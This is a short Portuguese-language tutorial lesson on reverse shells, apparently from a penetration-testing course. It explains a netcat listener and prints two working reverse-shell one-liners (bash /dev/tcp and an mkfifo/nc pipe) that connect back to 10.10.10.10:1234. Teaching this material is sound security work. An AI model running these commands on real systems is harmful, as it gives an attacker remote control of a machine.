# Reverse shell
Shell mais comum e mais simples de ser feito, é um shell que se conecta ao atacante, que está ouvindo em uma porta específica. Depois de descobrir a brecha no sistema alvo, podemos usar ferramentas como netcat, socat ou até mesmo python para criar um shell reverso. Depois disso executamos o shell no sistema falho e o atacante se conecta a nós.

## Ouvinte netcat
```shell
$ nc -lvnp 4444
```
Nesse comando:
- `-l` Modo de escuta, aguardando conexões
- `-v` Modo verbose, mostra informações sobre a conexão, como conexão bem-sucedida
- `-n` Não resolve DNS
- `-p` Porta que vai ser aberta

Agora executamos o shell reverso no sistema alvo:

**Nota: Precisamos saber o IP do sistema que vai receber a conexão, ou seja o nosso**
`$ ip a`

O comando para executar o shell varia de sistema e softwares instalados no alvo, a [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) tem uma lista de payloads para diferentes sistemas e softwares.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Depois de executar o shell no alvo, o atacante vai receber a conexão e terá acesso ao sistema alvo.

O reverse shell é útil quando precisamos de velocidade e simplicidade, mas não é o mais seguro, pois a conexão é feita diretamente ao atacante, o que pode ser facilmente detectado por um firewall ou IDS. Quando o comando do shell é interrompido, a conexão é perdida.

[próxima aula](shell2_bind.md)